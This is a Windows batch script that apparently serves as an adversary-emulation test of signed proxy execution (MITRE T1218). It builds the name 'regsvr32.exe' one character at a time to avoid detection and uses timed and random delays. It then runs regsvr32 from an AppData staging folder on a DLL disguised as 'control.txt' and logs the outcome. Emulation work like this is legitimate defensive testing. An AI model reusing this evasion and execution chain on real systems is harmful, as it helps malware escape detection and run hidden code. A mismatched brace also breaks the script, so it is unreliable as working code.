@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER encoded)
SET txisnba=%APPDATA%\7666\692964f4
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7666-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=control.txt
SET dvhhyc=7666

REM Random variables for script logic
SET zxsq=r
SET dfgh=e
SET jklm=g
SET cvbn=s
SET qazx=v
SET wsxc=c
SET edcv=s
SET rfvt=.

REM Initial delay
timeout /t 45 /nobreak >nul

REM Build LOLBIN using character assembly
SET c1=r
SET c2=e
SET c3=g
SET c4=s
SET c5=v
SET c6=c
SET c7=s
SET c8=.
SET c9=e
SET c10=x
SET c11=e
SET lolbin=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%c9%%c10%%c11%

REM Delay before server check
ping -n 12 127.0.0.1 >nul

REM Server availability check (Task 0)
%lolbin% /u /s >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    SET check_result=1
    SET err_detail=
) ELSE (
    SET check_result=0
    SET err_detail=connection_refused
)

REM Log TTP for server check
SET timestamp=%DATE:~10,4%-%DATE:~4,2%-%DATE:~7,2% %TIME:~0,2%:%TIME:~3,2%:%TIME:~6,2%.%TIME:~9,2%
IF NOT EXIST "%APPDATA%\!rrocubc!" MD "%APPDATA%\!rrocubc!" >nul 2>&1
ECHO [%timestamp%][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Proxy_Execution=!check_result!:!err_detail! >> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul || REM

REM Random delay
SET /A random_delay=%RANDOM% %% 20 + 10
timeout /t %random_delay% /nobreak >nul

REM Change directory (Task 2)
CD /D "!txisnba!" >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    SET dir_result=0
    SET dir_err=path_not_found
    SET timestamp=%DATE:~10,4%-%DATE:~4,2%-%DATE:~7,2% %TIME:~0,2%:%TIME:~3,2%:%TIME:~6,2%.%TIME:~9,2%
    ECHO [%timestamp%][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Proxy_Execution=!dir_result!:!dir_err! >> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul || REM
    EXIT /B
) ELSE (
    SET dir_result=1
    SET dir_err=
)

CHOICE /C Y /N /D Y /T 8 >nul

REM Execute DLL (Task 3)
SET file_exist=0
IF EXIST "!xzanpex!" (
    SET file_exist=1
    %lolbin% "!xzanpex!" >nul 2>&1
)

REM Log execution result
SET timestamp=%DATE:~10,4%-%DATE:~4,2%-%DATE:~7,2% %TIME:~0,2%:%TIME:~3,2%:%TIME:~6,2%.%TIME:~9,2%
IF !file_exist! EQU 1 (
    SET exec_result=%ERRORLEVEL%
    IF !exec_result! EQU 0 (
        SET result_val=1
        SET err_val=
    ) ELSE (
        SET result_val=0
        SET err_val=assembly_load_failed
    }
) ELSE (
    SET result_val=0
    SET err_val=file_not_found
)
ECHO [%timestamp%][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Proxy_Execution=!result_val!:!err_val! >> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul || REM

REM Final delay
ping -n 6 127.0.0.1 >nul
ENDLOCAL